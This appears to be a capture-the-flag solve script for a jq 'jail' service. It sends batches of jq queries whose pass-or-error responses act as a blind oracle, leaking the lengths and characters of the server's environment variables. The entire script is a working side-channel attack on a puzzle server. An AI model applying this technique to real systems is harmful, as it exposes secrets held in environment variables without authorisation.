#!/usr/bin/env python3
import json, socket, re, time, subprocess
from pathlib import Path
import solve_remote_live as base
from solve_set_oracle_v3_fixed import jq_accept_set, predicate

HOST='challs.pyjail.club'; PORT=20219
raw=json.loads(Path('chains_225.json').read_text())
vals=list(range(0,400))
# map exact singleton accepting v -> ops
exact={}
for k,ops in raw.items():
    acc=jq_accept_set('jq', vals, ops)
    if len(acc)==1:
        exact[next(iter(acc))]=ops
print('[+] exact predicates', len(exact), 'range', min(exact), max(exact), flush=True)

def recover_scalar(conn, expr, lo=0, hi=260):
    qs=[]; vs=[]
    for v in range(lo,hi+1):
        if v in exact:
            qs.append(f'{expr}|{predicate(exact[v])}|error')
            vs.append(v)
    ans=conn.query_batch(qs)
    hits=[v for v,a in zip(vs,ans) if a=='error']
    return hits

selectors=[
 'env|flatten|sort|last',
 'env|flatten|sort|first',
 'env|flatten|last',
 'env|flatten|first',
 'env|keys|sort|last',
 'env|keys|sort|first',
]

conn=base.RemoteOracle(HOST,PORT,90)
try:
    for s in selectors:
        print('\n[*]',s, flush=True)
        for suffix,label,hi in [
            ('length','len',160),
            ('explode|first','first',160),
            ('explode|last','last',160),
            ('explode|min','min',160),
            ('explode|max','max',160),
            ('explode|add','sum',20000),
            ('explode|unique|add','uniqsum',20000),
        ]:
            # exact only generated to 399; for sum skip if too high
            if hi>399: continue
            hits=recover_scalar(conn, f'{s}|{suffix}', 0, hi)
            print(label, hits, ''.join(chr(x) for x in hits if 32<=x<127), flush=True)
finally:
    conn.close()
